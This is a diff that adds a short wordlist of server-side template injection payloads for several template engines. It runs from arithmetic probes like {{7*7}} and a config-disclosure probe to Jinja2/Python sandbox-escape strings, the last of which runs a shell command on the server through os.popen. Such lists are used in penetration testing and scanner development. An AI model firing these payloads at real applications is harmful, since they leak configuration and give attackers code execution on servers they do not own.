@@ -1,0 +1,10 @@
+{{7*7}}
+${7*7}
+#{7*7}
+<%= 7*7 %>
+{7*7}
+{{7*'7'}}
+${{<%[%'"}}%\
+{{config}}
+{{''.__class__.__mro__[2].__subclasses__()}}
+{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
